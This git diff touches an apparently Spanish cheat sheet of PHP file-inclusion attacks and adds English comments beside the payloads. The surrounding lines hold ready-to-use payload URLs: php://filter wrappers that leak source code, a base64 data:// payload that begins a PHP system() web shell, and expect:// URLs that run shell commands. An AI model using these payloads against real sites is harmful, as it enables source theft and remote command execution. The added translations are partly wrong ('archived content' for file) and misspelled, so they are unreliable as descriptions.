@@ -148,7 +148,7 @@ http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encod
 ```
 > LFI Conversión Codificación de caracteres
 
-+ Permite visualizar contenido archivo en la misma pagina web
++ Allows you to view archived content on the same web page
 ```
 http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
 ```
@@ -172,6 +172,7 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 
 > **RFI Wrapper EXPECT** :
 
++ Allow to excute commands
 ```
 http://example.com/index.php?page=php:expect://id
 http://example.com/index.php?page=php:expect://ls
